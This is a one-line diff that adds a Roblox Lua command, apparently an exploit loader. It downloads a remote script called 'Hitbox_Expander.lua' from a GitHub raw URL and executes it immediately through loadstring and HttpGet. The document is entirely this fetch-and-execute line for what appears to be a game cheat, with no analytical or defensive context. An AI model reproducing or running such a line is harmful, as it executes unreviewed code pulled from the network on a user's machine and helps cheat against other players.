@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuizTech9/Official/main/Hitbox_Expander.lua"))();
